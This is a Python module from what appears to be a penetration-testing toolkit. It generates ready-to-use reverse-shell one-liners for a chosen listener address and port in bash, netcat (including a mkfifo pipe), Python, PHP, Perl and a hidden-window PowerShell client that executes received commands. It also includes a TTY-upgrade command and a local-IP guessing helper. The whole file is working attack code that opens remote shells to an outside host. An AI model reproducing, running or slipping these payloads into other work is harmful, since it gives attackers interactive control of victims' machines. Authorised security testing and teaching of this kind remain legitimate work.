"""Reverse-shell payload generation and the TTY-upgrade primitive."""

from __future__ import annotations

import socket

# Sent to a connected dumb shell to turn it into a full PTY.
TTY_UPGRADE = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"


def guess_lhost() -> str:
    """Best-effort local IP (the address used to reach the default route)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def generate(lhost: str, lport: int) -> dict[str, str]:
    """Return a map of {name: reverse-shell one-liner} for the given LHOST/LPORT."""
    return {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "sh-fifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "nc-e": f"nc -e /bin/sh {lhost} {lport}",
        "python3": (
            "python3 -c 'import socket,os,pty;s=socket.socket();"
            f's.connect(("{lhost}",{lport}));'
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        ),
        "php": f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ),
        "powershell": (
            "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('"
            f"{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName "
            "System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()}\""
        ),
    }
